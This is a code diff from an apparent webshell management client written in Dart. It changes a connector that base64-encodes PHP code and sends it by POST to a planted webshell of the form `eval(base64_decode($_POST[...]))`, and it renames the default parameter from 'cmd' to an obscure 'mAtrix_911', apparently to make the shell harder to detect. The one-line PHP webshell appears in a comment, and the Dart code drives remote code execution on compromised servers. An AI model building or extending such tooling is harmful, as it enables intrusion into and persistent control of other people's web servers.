@@ -3,13 +3,14 @@ import 'dart:convert';
 
 import 'package:http/http.dart' as http;
 
+import '../app/constants.dart';
 import '../utils/encoding_utils.dart';
 import 'php_eval_connector.dart';
 
-/// `php_b64rot13_post.php`：`eval(base64_decode($_POST['cmd']))`
+/// `php_b64rot13_post.php`：`eval(base64_decode($_POST['mAtrix_911']))`
 ///
 /// 与 PhpEvalConnector 能力完全相同，区别仅在传输编码：
-///   - 参数名默认为 `cmd`（可通过 password 字段覆盖）
+///   - 参数名默认为 `mAtrix_911`（可通过 password 字段覆盖）
 ///   - 值为 base64 编码后的 PHP 代码
 class PhpB64Rot13Connector extends PhpEvalConnector {
   PhpB64Rot13Connector(super.webshell);
@@ -18,9 +19,10 @@ class PhpB64Rot13Connector extends PhpEvalConnector {
   Future<String> sendPhpCode(String phpCode) async {
     try {
       final uri = Uri.parse(webshell.url);
-      // payload 参数名默认 cmd；用 password 字段可覆盖为自定义名
-      final param =
-          webshell.password?.isNotEmpty == true ? webshell.password! : 'cmd';
+      // password 字段在该连接器中表示 POST 参数名。
+      final param = webshell.password?.isNotEmpty == true
+          ? webshell.password!
+          : AppConstants.defaultShellPassword;
       final encoded = base64.encode(utf8.encode(phpCode));
 
       final response = await http
